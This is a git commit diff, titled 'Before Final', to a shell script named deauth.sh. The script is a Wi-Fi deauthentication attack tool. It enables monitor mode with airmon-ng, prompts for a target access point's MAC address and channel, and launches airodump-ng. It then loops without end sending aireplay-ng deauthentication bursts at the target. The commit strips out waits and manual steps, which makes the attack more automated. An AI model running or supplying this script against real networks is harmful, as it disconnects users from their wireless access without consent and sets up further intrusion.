865af6d37c80fe51ec8801f2cd88055932af8f86
Chris Cleggett <chris@localhost.localdomain>
2019-11-29 16:01:28 +0000

    Before Final

--- deauth.sh
+++ deauth.sh
@@ -6,28 +6,14 @@ clear
 airmon-ng
 echo -n "Enter the wireless card to use for the attack: "
 read wcard
-
-sleep 5
 clear
-
 airmon-ng start $wcard
-sleep 5
 clear
-
-echo "A window will open shortly showing a list of APs nearby. When you have found the MAC, and channel number you need, close the window."
-sleep 5
-xterm -e airodump-ng wlan1
-
-clear
-
 echo -n "Enter the MAC address of the target: "
 read mac
-
 echo -n "Enter the channel number: "
 read chan
-
-echo "In a new termnal, run as root, type: airodump-ng --channel $chan $wcard  then run the command. The attack commences in 60 seconds."
-sleep 60
+xterm -e airodump-ng --channel $chan $wcard &
 
 for (( ; ; ))
 do
@@ -35,5 +21,3 @@ do
    aireplay-ng -0 100 -a $mac $wcard
    sleep 60
 done
-
-airmon-ng stop $wcard
